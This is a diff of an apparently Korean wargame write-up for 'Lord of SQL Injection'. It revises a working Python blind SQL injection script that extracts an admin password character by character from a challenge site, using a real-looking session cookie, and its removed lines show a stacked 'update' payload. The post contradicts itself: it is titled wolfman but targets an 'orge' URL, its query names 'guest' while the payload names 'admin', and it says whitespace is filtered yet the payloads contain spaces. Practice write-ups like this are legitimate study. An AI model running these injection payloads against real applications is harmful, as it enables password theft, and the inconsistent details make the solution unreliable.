@@ -1,6 +1,6 @@
 ---
-title: "[LOS] orc"
-date: 2025-03-25 00:00:00
+title: "[LOS] wolfman"
+date: 2025-03-26 00:00:00
 categories: [Wargame, Lord of SQL Injection]
 tags: [webhacking, sqli]
 published: True
@@ -9,7 +9,7 @@ published: True
 # Query
 
 ```sql
-select id from prob_orc where id='admin' and pw='{$_GET[pw]}'
+select id from prob_wolfman where id='guest' and pw='{$_GET[pw]}'
 ```
 
 <br>
@@ -22,6 +22,7 @@ select id from prob_orc where id='admin' and pw='{$_GET[pw]}'
 - `_`
 - `.`
 - `()`
+- ` ` (white space)
 
 <br>
 
@@ -33,35 +34,25 @@ $_GET[pw] = addslashes($_GET[pw]);
 
 <br>
 
-## if statement
-
-```php
-if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("orc");
-```
-
-<br>
-
 # Analysis
 
-- addslashes 함수 수행 전에 쿼리문이 실행된다
-- 실행된 쿼리문이 출력이 되지는 않기에 update, insert와 같은 구문을 통해 데이터베이스를 변경할 수 있다.
-- `prob` 문자열이 필터링되기에 `?pw=1' or 1=1; update char(0x70726F625F6F7263) set pw='123' where id='admin' %23`와 같은 페이로드를 시도하였지만 변화X
-- 첫 번째 쿼리 실행 후 db에서 값을 가져온다면 `<h2>Hello admin</h2>`을 echo하기에 blind sqli 시도 가능
+- [orc](https://1unaram.github.io/posts/los-orc/) 문제와 같이 blind sql injection이 가능
+- `or` 대신 `||` 연산자를 사용하고, `and` 대신 `&&`를 사용해야하나 `&`를 query string으로 인식하기에 인코딩하여 `%26`으로 사용
 
 <br>
 
-# exploit code
+# Exploit code
 
 ```python
 import requests
 
-url = 'https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php'
-cookie = '{PHPSESSID}'
+url = 'https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php'
+cookie = '39je4ges6g212tfsms39bnhqk5'
 
 # Get the length of the password
 length = 1
 while True:
-    payload = f"?pw=0' or id='admin' and length(pw)={length} %23 "
+    payload = f"?pw=' || id='admin' %26%26 length(pw)={length} %23 "
 
     res = requests.get(url=f'{url}{payload}', cookies={'PHPSESSID': cookie})
 
@@ -80,7 +71,7 @@ for i in range(1, length + 1):
     high = ord('z')
     while low <= high:
         mid = (low + high) // 2
-        payload = f"?pw=0' or id='admin' and ord(substring(pw,{i},1))<={mid} %23 "
+        payload = f"?pw=' || id='admin' %26%26 ascii(substring(pw,{i},1))<={mid} %23 "
         res = requests.get(url=f'{url}{payload}', cookies={'PHPSESSID': cookie})
 
         if '<h2>Hello admin</h2>' in res.text:
